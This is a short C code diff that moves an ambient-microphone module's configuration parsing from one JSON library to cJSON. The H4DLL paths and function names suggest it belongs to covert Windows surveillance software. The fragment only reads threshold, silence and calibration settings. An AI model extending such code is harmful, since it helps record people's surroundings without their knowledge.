@@ -1,5 +1,5 @@
 #include <Windows.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
 #include "../../H4DLL/bss.h"
@@ -48,12 +48,15 @@ DWORD WINAPI PM_AmbMicStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-DWORD WINAPI PM_AmbMicInit(JSONObject elem)
+DWORD WINAPI PM_AmbMicInit(cJSON* elem)
 {
-	amb_mic_voice_tsld = (DWORD)(elem[L"threshold"]->AsNumber() * 1000);
-	amb_mic_silence_time = (DWORD)elem[L"silence"]->AsNumber();
+	cJSON* threshold = cJSON_GetObjectItem(elem, "threshold");
+	cJSON* silence = cJSON_GetObjectItem(elem, "silence");
+	cJSON* autosense = cJSON_GetObjectItem(elem, "autosense");
+	amb_mic_voice_tsld = (DWORD)(cJSON_GetNumberValue(threshold)* 1000);
+	amb_mic_silence_time = (DWORD)cJSON_GetNumberValue(silence);
 	amb_mic_silence_time /= 5; // E' in blocchi da 5 secondi
-	amb_mic_calibration = (BOOL)elem[L"autosense"]->AsBool();
+	amb_mic_calibration = (BOOL)cJSON_IsTrue(autosense);
 
 	return 1;
 }
